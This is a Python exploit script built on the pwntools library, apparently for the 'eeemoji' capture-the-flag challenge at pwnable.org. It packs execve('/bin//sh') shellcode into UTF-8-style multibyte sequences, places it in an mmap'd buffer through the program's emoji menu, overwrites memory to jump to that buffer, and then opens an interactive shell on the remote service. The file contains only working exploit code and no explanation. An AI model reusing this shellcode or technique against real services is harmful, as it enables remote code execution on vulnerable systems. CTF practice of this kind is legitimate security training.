#!/usr/bin/env python3

from pwn import *

cmdline = "./eeemoji"
host, port = "pwnable.org", 31322

local = 0

context.arch = 'amd64'
context.aslr = False
context.log_level = "DEBUG"
context.terminal = ["tmux", "split", "-h"]
if local:
    p = process(cmdline.split(), env={"LD_PRELOAD":"./libc-2.27.so"})
else:
    p = remote(host, port)


def convert(value):
    mask = 0b111111
    pad = 0b10000000
    if value < 0x80:
        return value.to_bytes(1, 'little')
    elif value < 0x800:
        return (((0b11000000 | (value >> 6)) << 8) + (pad | (value & mask))).to_bytes(2, 'big')
    elif value < 0x10000:
        return (((0b11100000 | (value >> 12)) << 16) + ((pad | ((value >> 6) & mask)) << 8) + (pad | (value & mask))).to_bytes(3, 'big')
    elif value < 0x200000:
        return (((0b11110000 | (value >> 18)) << 24) + ((pad | ((value >> 12) & mask)) << 16)
                + ((pad | ((value >> 6) & mask)) << 8) + (pad | (value & mask))).to_bytes(4, 'big')
    elif value < 0x4000000:
        return (((0b11111000 | (value >> 24)) << 32) + ((pad | ((value >> 18) & mask)) << 24)
                + ((pad | ((value >> 12) & mask)) << 16) + ((pad | ((value >> 6) & mask)) << 8)
                + (pad | (value & mask))).to_bytes(5, 'big')
    elif value < 0x80000000:
        return (((0b11111100 | (value >> 30)) << 40) + ((pad | ((value >> 24) & mask)) << 32)
                + ((pad | ((value >> 18) & mask)) << 24) + ((pad | ((value >> 12) & mask)) << 16)
                + ((pad | ((value >> 6) & mask)) << 8) + (pad | (value & mask))).to_bytes(6, 'big')
    else:
        raise Exception()


def malloc():
    p.sendlineafter("🐮🍺\n", "🍺")
    p.recvuntil("mmap() at @")
    return int(p.recvline().strip(), 16)

def doing():
    p.sendlineafter("🐮🍺\n", "🐮")

def fill(payload):
    p.sendlineafter("🐮🍺\n", "🐴")
    p.sendafter("🐴😓", payload)

maddr = malloc()

log.info("{}".format(hex(maddr)))

if local:
    gdb.attach(p, gdbscript="b *0x555555554c84\nc")

shellcode = b"\x90\x31\xc0\x50\x90\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x90\x90\x90\x48\x89\xe7\x90\x31\xd2\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
shellcode = shellcode.ljust((len(shellcode) // 4) * 4 + (4 if len(shellcode) % 4 else 0), b'\x00')

res = b""
x = 0
for i in range(0, len(shellcode), 4):
    sub = u32(shellcode[i:i+4])
    print(hex(sub))
    res += convert(sub)
    x += 1

fill(res + b'\n')

maddr2 = malloc()

inst = asm('push r9')
fill((b"\0" + convert(maddr)) * 64 + convert(u16(inst)))

context.log_level = "INFO"
p.interactive()

